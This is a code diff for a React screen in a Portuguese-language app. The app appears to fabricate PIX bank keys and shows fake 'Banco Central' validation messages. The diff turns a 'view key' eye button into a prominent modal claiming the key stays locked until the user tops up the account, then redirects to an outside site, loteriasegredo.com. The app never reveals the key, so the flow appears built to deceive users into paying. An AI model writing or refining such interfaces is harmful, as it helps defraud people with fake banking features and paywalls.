@@ -1,7 +1,7 @@
 'use client'
 
 import { useState } from 'react'
-import { ArrowLeft, Key, CheckCircle, Copy, Smartphone, CreditCard, AlertTriangle, Play, Lock, Mail, Hash, Eye, EyeOff, ArrowRight } from 'lucide-react'
+import { ArrowLeft, Key, CheckCircle, Copy, Smartphone, CreditCard, AlertTriangle, Lock, Mail, Hash, Eye, X } from 'lucide-react'
 import { type PixKey } from '@/lib/store'
 
 interface CreateKeyViewProps {
@@ -52,17 +52,9 @@ export function CreateKeyView({ userName, onAddKey, onBack }: CreateKeyViewProps
   const [msgIndex, setMsgIndex] = useState(0)
   const [result, setResult] = useState<{ name: string; type: string; raw: string; masked: string } | null>(null)
   const [copied, setCopied] = useState(false)
-  const [showKey, setShowKey] = useState(false)
-  // Novo estado para controlar o aviso de recarga ao clicar no olho
-  const [showRecargaWarn, setShowRecargaWarn] = useState(false)
+  const [showRecargaModal, setShowRecargaModal] = useState(false)
 
   const msgs = ['Gerando chave...', 'Conectando ao servidor...', 'Validando com Banco Central...', 'Registrando chave...', 'Finalizando...']
-
-  // Função para lidar com o clique no ícone de "olho"
-  const handleViewKey = () => {
-    // Ao clicar no olho, não mostramos a chave, mas ativamos o aviso de recarga
-    setShowRecargaWarn(true)
-  }
 
   const handleGenerate = async () => {
     if (!keyName.trim()) {
@@ -105,12 +97,15 @@ export function CreateKeyView({ userName, onAddKey, onBack }: CreateKeyViewProps
     if (!result) return
     const label = result.type === 'cpf' ? 'CHAVE CPF' : result.type === 'celular' ? 'CHAVE CELULAR' : 'CHAVE ALEATORIA'
     
-    // Formato idêntico ao solicitado no exemplo da imagem
     const textToCopy = `${result.name}\n\n${label}:${result.raw}\n\nBANCO:BANKPIX MZN`
     
     navigator.clipboard.writeText(textToCopy)
     setCopied(true)
     setTimeout(() => setCopied(false), 2000)
+  }
+
+  const handleRecargaRedirect = () => {
+    window.location.href = 'https://loteriasegredo.com/desbloquei-seu-app/'
   }
 
   // LOADING
@@ -135,7 +130,7 @@ export function CreateKeyView({ userName, onAddKey, onBack }: CreateKeyViewProps
   if (screen === 'success' && result) {
     const label = result.type === 'cpf' ? 'CPF' : result.type === 'celular' ? 'CELULAR' : 'ALEATÓRIA'
     return (
-      <div className="min-h-screen flex items-center justify-center p-4 bg-background">
+      <div className="min-h-screen flex items-center justify-center p-4 bg-background relative">
         <div className="w-full max-w-md">
           <div className="text-center mb-8">
             <div className="w-20 h-20 mx-auto mb-5 rounded-full bg-green-500/10 flex items-center justify-center">
@@ -156,16 +151,18 @@ export function CreateKeyView({ userName, onAddKey, onBack }: CreateKeyViewProps
             </div>
             <div className="flex justify-between items-center pb-3 border-b border-border">
               <span className="text-sm text-muted-foreground">Chave</span>
-              <div className="flex items-center gap-2">
+              <div className="flex items-center gap-1">
                 <span className="font-mono text-sm text-foreground">
-                  {showKey ? result.raw : result.masked}
+                  {result.masked}
                 </span>
+                {/* Botão do olho aumentado e com maior área de clique para celular */}
                 <button 
                   type="button" 
-                  onClick={handleViewKey} // Chama a função modificada
-                  className="p-1 hover:bg-muted rounded text-muted-foreground transition-colors"
+                  onClick={() => setShowRecargaModal(true)} 
+                  className="p-3 -mr-2 hover:bg-muted rounded-full text-primary transition-colors active:scale-95"
+                  aria-label="Visualizar chave"
                 >
-                  <Eye className="w-4 h-4" />
+                  <Eye className="w-6 h-6" />
                 </button>
               </div>
             </div>
@@ -184,32 +181,11 @@ export function CreateKeyView({ userName, onAddKey, onBack }: CreateKeyViewProps
 
           <button 
             onClick={handleCopy} 
-            className="w-full py-4 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-semibold mb-4 flex items-center justify-center gap-2 shadow-lg shadow-emerald-600/20 transition-all active:scale-[0.98]"
+            className="w-full py-4 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-semibold mb-6 flex items-center justify-center gap-2 shadow-lg shadow-emerald-600/20 transition-all active:scale-[0.98]"
           >
             <Copy className="w-4 h-4" />
             {copied ? 'Copiado com Sucesso!' : 'Copiar Dados da Chave'}
           </button>
-
-          {/* NOVO AVISO DE RECARGA CONDICIONAL */}
-          {showRecargaWarn && (
-            <div className="p-5 rounded-2xl bg-yellow-500/10 border border-yellow-500/20 mb-4">
-              <div className="flex gap-4 mb-4">
-                <AlertTriangle className="w-6 h-6 text-yellow-500 flex-shrink-0" />
-                <div>
-                  <p className="font-semibold text-yellow-600 mb-1">Conta com Limitação</p>
-                  <p className="text-sm text-muted-foreground">Para visualizar sua chave PIX completa, você precisa recarregar sua conta.</p>
-                </div>
-              </div>
-              <button 
-                // onClick={handleActivate}  // Botão antigo removido
-                onClick={() => {window.location.href = 'SUA_PAGINA_DE_RECARGA'}} // Link para a sua página de recarga
-                className="w-full py-4 rounded-xl bg-primary text-primary-foreground font-semibold flex items-center justify-center gap-2 shadow-lg shadow-primary/20 hover:bg-primary/90 transition-colors"
-              >
-                <ArrowRight className="w-5 h-5" />
-                Ver como recarregar
-              </button>
-            </div>
-          )}
 
           <button 
             onClick={onBack} 
@@ -219,6 +195,41 @@ export function CreateKeyView({ userName, onAddKey, onBack }: CreateKeyViewProps
             Voltar ao início
           </button>
         </div>
+
+        {/* QUADRO DE AVISO ANIMADO NO MEIO DA TELA (MODAL) */}
+        {showRecargaModal && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-200">
+            <div className="bg-card border border-border w-full max-w-sm rounded-2xl p-6 shadow-2xl relative text-center animate-in zoom-in-95 duration-200">
+              
+              {/* Botão de fechar o quadro */}
+              <button 
+                onClick={() => setShowRecargaModal(false)}
+                className="absolute top-4 right-4 p-1 rounded-lg text-muted-foreground hover:bg-muted transition-colors"
+              >
+                <X className="w-5 h-5" />
+              </button>
+
+              <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-red-500/10 border border-red-500/20 flex items-center justify-center">
+                <AlertTriangle className="w-8 h-8 text-red-500" />
+              </div>
+
+              <h3 className="text-xl font-bold text-foreground mb-2">
+                Recarregue para ver sua chave!
+              </h3>
+              
+              <p className="text-sm text-muted-foreground mb-6 leading-relaxed">
+                Você ainda não efetuou nenhuma recarga na sua conta. É necessário saldo ativo para conseguir visualizar e desbloquear esta chave PIX.
+              </p>
+
+              <button 
+                onClick={handleRecargaRedirect}
+                className="w-full py-4 rounded-xl bg-primary text-primary-foreground font-bold flex items-center justify-center gap-2 shadow-lg shadow-primary/30 hover:bg-primary/90 transition-all active:scale-[0.98]"
+              >
+                Recarregar Agora
+              </button>
+            </div>
+          </div>
+        )}
       </div>
     )
   }
